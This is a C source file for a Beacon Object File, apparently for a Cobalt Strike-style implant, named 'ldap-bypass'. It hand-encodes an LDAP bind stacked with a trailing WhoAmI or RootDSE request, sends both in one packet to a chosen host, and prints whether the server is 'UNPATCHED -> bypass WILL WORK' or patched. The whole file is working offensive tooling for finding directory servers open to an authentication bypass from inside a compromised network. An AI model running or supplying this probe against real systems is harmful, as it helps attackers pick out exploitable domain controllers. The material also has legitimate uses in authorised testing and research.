#include "bofdefs.h"
#include "base.c"

// ─── BER helpers (mirror Python LdapBypassInformer._ber_*) ──────────────────

static int _ber_lbytes(int n) {
    if (n < 0x80) return 1;
    int c = 1, v = n;
    while (v >>= 8) c++;
    return c + 1;
}

static unsigned char* _tlv(unsigned char tag, const unsigned char *val, int vlen, int *outlen) {
    int lb = _ber_lbytes(vlen);
    *outlen = 1 + lb + vlen;
    unsigned char *b = (unsigned char*)MSVCRT$malloc(*outlen);
    if (!b) return NULL;
    b[0] = tag;
    if (vlen < 0x80) {
        b[1] = (unsigned char)vlen;
    } else {
        int nb = 0, v = vlen; unsigned char tmp[4];
        while (v) { tmp[nb++] = (unsigned char)(v & 0xFF); v >>= 8; }
        b[1] = (unsigned char)(0x80 | nb);
        for (int i = 0; i < nb; i++) b[2+i] = tmp[nb-1-i];
    }
    if (vlen > 0 && val) MSVCRT$memcpy(b + 1 + lb, val, vlen);
    return b;
}

static unsigned char* _enc_int(int n, int *outlen) {
    unsigned char body[5]; int blen = 0;
    if (n == 0) { body[0] = 0; blen = 1; }
    else {
        unsigned int v = (unsigned int)n;
        while (v) { body[blen++] = (unsigned char)(v & 0xFF); v >>= 8; }
        for (int i=0, j=blen-1; i<j; i++,j--) { unsigned char t=body[i]; body[i]=body[j]; body[j]=t; }
        if (body[0] & 0x80) { MSVCRT$memmove(body+1, body, blen); body[0]=0; blen++; }
    }
    return _tlv(0x02, body, blen, outlen);
}

static unsigned char* _enc_octet(const char *s, int *outlen) {
    return _tlv(0x04, (const unsigned char*)s, (int)MSVCRT$strlen(s), outlen);
}

static unsigned char* _ldap_msg(int msgid, const unsigned char *op, int oplen, int *outlen) {
    int il; unsigned char *ibuf = _enc_int(msgid, &il);
    int inner_len = il + oplen;
    unsigned char *inner = (unsigned char*)MSVCRT$malloc(inner_len);
    MSVCRT$memcpy(inner, ibuf, il);
    MSVCRT$memcpy(inner + il, op, oplen);
    MSVCRT$free(ibuf);
    unsigned char *msg = _tlv(0x30, inner, inner_len, outlen);
    MSVCRT$free(inner);
    return msg;
}

static unsigned char* _bind_req(const char *dn, const char *pw, int *outlen) {
    int vl, nl, sl;
    unsigned char *ver  = _enc_int(3, &vl);
    unsigned char *name = _enc_octet(dn, &nl);
    unsigned char *simp = _tlv(0x80, (const unsigned char*)pw, (int)MSVCRT$strlen(pw), &sl);
    int body_len = vl + nl + sl;
    unsigned char *body = (unsigned char*)MSVCRT$malloc(body_len);
    MSVCRT$memcpy(body,       ver,  vl);
    MSVCRT$memcpy(body+vl,    name, nl);
    MSVCRT$memcpy(body+vl+nl, simp, sl);
    MSVCRT$free(ver); MSVCRT$free(name); MSVCRT$free(simp);
    unsigned char *req = _tlv(0x60, body, body_len, outlen);
    MSVCRT$free(body);
    return req;
}

static unsigned char* _whoami_req(int *outlen) {
    const char *oid = "1.3.6.1.4.1.4203.1.11.3";
    int il; unsigned char *inner = _tlv(0x80, (const unsigned char*)oid, (int)MSVCRT$strlen(oid), &il);
    unsigned char *req = _tlv(0x77, inner, il, outlen);
    MSVCRT$free(inner);
    return req;
}

static unsigned char* _rootdse_req(int *outlen) {
    int l0,l1,l2,l3,l4,l5,l6,l7;
    unsigned char *base   = _enc_octet("", &l0);
    unsigned char *scope  = _tlv(0x0A, (const unsigned char*)"\x00", 1, &l1);
    unsigned char *deref  = _tlv(0x0A, (const unsigned char*)"\x00", 1, &l2);
    unsigned char *size   = _enc_int(0, &l3);
    unsigned char *tim    = _enc_int(0, &l4);
    unsigned char *tyonly = _tlv(0x01, (const unsigned char*)"\x00", 1, &l5);
    unsigned char *filt   = _tlv(0x87, (const unsigned char*)"objectClass", 11, &l6);
    unsigned char *attrs  = _tlv(0x30, NULL, 0, &l7);
    int bl = l0+l1+l2+l3+l4+l5+l6+l7;
    unsigned char *body = (unsigned char*)MSVCRT$malloc(bl);
    int off = 0;
#define _CP(x,l) MSVCRT$memcpy(body+off,(x),(l)); off+=(l); MSVCRT$free(x)
    _CP(base,l0); _CP(scope,l1); _CP(deref,l2); _CP(size,l3);
    _CP(tim,l4); _CP(tyonly,l5); _CP(filt,l6); _CP(attrs,l7);
#undef _CP
    unsigned char *req = _tlv(0x63, body, bl, outlen);
    MSVCRT$free(body);
    return req;
}

// ─── BER parser ─────────────────────────────────────────────────────────────

// Returns count of LDAP message IDs found; also extracts bind resultCode (msgid==1).
static int _parse_msgs(const unsigned char *buf, int len,
                       int *msgids, int max_ids, int *bind_rc) {
    int count = 0; *bind_rc = -1;
    int i = 0;
    while (i + 2 <= len && count < max_ids) {
        if (buf[i] != 0x30) break;
        i++;
        int lb = buf[i++];
        int mlen = 0;
        if (lb & 0x80) {
            int nb = lb & 0x7F;
            if (i + nb > len) break;
            while (nb--) mlen = (mlen << 8) | buf[i++];
        } else { mlen = lb; }
        if (i + mlen > len) break;
        const unsigned char *m = buf + i;
        int p = 0;
        if (p+2 > mlen || m[p] != 0x02) { i += mlen; continue; }
        p++;
        int idlen = m[p++];
        if (p + idlen > mlen) { i += mlen; continue; }
        int msgid = 0;
        for (int k = 0; k < idlen; k++) msgid = (msgid << 8) | m[p++];
        msgids[count++] = msgid;
        // Extract bind resultCode from msgid=1 bindResponse (op=0x61)
        if (msgid == 1 && p < mlen && m[p] == 0x61) {
            p++;
            int oplen = m[p++];
            if (oplen & 0x80) {
                int nb = oplen & 0x7F; oplen = 0;
                while (nb-- && p < mlen) oplen = (oplen << 8) | m[p++];
            }
            if (p + 2 <= mlen && m[p] == 0x0A) {
                p++;
                int rclen = m[p++];
                if (p + rclen <= mlen && rclen >= 1) *bind_rc = m[p];
            }
        }
        i += mlen;
    }
    return count;
}

// ─── Probe ──────────────────────────────────────────────────────────────────

static void do_probe(const char *host, int port, const char *dn, const char *pw,
                     int trailing_type, int timeout_ms) {
    WSADATA wsa;
    WS2_32$WSAStartup(MAKEWORD(2,2), &wsa);

    char port_str[8]; MSVCRT$sprintf(port_str, "%d", port);
    struct addrinfo hints, *res = NULL;
    MSVCRT$memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (WS2_32$getaddrinfo(host, port_str, &hints, &res) != 0 || !res) {
        internal_printf("[ldap-bypass] DNS resolution failed for %s\n", host);
        WS2_32$WSACleanup(); return;
    }

    SOCKET sock = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (WS2_32$connect(sock, res->ai_addr, (int)res->ai_addrlen) != 0) {
        internal_printf("[ldap-bypass] connect to %s:%d failed (err=%d)\n",
            host, port, WS2_32$WSAGetLastError());
        WS2_32$closesocket(sock); WS2_32$freeaddrinfo(res); WS2_32$WSACleanup(); return;
    }
    WS2_32$freeaddrinfo(res);

    DWORD tv = (DWORD)timeout_ms;
    WS2_32$setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

    // Build stacked packet: bind(msgid=1) || trailing(msgid=2) in one buffer
    int op1l, m1l, op2l, m2l;
    unsigned char *op1 = _bind_req(dn, pw, &op1l);
    unsigned char *m1  = _ldap_msg(1, op1, op1l, &m1l);
    MSVCRT$free(op1);
    unsigned char *op2 = (trailing_type == 0) ? _whoami_req(&op2l) : _rootdse_req(&op2l);
    unsigned char *m2  = _ldap_msg(2, op2, op2l, &m2l);
    MSVCRT$free(op2);

    int pkt_len = m1l + m2l;
    unsigned char *pkt = (unsigned char*)MSVCRT$malloc(pkt_len);
    MSVCRT$memcpy(pkt, m1, m1l);
    MSVCRT$memcpy(pkt + m1l, m2, m2l);
    MSVCRT$free(m1); MSVCRT$free(m2);

    unsigned char *rbuf = (unsigned char*)MSVCRT$malloc(65536);
    int recv_len = 0;

    WS2_32$send(sock, (const char*)pkt, pkt_len, 0);
    int r;
    while (recv_len < 65536 &&
           (r = WS2_32$recv(sock, (char*)(rbuf+recv_len), 65536-recv_len, 0)) > 0)
        recv_len += r;

    {
        int msgids[32]; int bind_rc = -1;
        int n = _parse_msgs(rbuf, recv_len, msgids, 32, &bind_rc);

        int saw1 = 0, saw2 = 0;
        for (int i = 0; i < n; i++) {
            if (msgids[i] == 1) saw1 = 1;
            if (msgids[i] == 2) saw2 = 1;
        }

        const char *rc_name = "unknown";
        if      (bind_rc == 0)  rc_name = "success";
        else if (bind_rc == 1)  rc_name = "operationsError";
        else if (bind_rc == 8)  rc_name = "strongerAuthRequired";
        else if (bind_rc == 49) rc_name = "invalidCredentials";
        else if (bind_rc == 53) rc_name = "unwillingToPerform";

        internal_printf("[%s] bind: %s (rc=%d) | PDUs: %d | trailing msgID-2: %s\n",
            host, rc_name, bind_rc, n, saw2 ? "yes" : "no");

        if (saw2)
            internal_printf("[%s] VERDICT: UNPATCHED -> stacked op processed -> bypass WILL WORK\n", host);
        else if (saw1)
            internal_printf("[%s] VERDICT: PATCHED -> stacked op discarded (Oct-2026 fix)\n", host);
        else
            internal_printf("[%s] VERDICT: INCONCLUSIVE -> no bindResponse; check creds/port\n", host);
    }

    MSVCRT$free(pkt);
    MSVCRT$free(rbuf);
    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();
}

// ─── BOF entry ──────────────────────────────────────────────────────────────

#ifdef BOF
VOID go(IN PCHAR Buffer, IN ULONG Length) {
    if (!bofstart()) return;

    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    char *host     = (char*)BeaconDataExtract(&parser, NULL);
    char *dn       = (char*)BeaconDataExtract(&parser, NULL);
    char *pw       = (char*)BeaconDataExtract(&parser, NULL);
    int   port     = BeaconDataInt(&parser);
    int   trailing = BeaconDataInt(&parser);

    if (!host || !dn || !pw) {
        internal_printf("[ldap-bypass] missing required args\n");
        printoutput(TRUE); return;
    }

    do_probe(host, port, dn, pw, trailing, 5000);
    printoutput(TRUE);
}
#endif
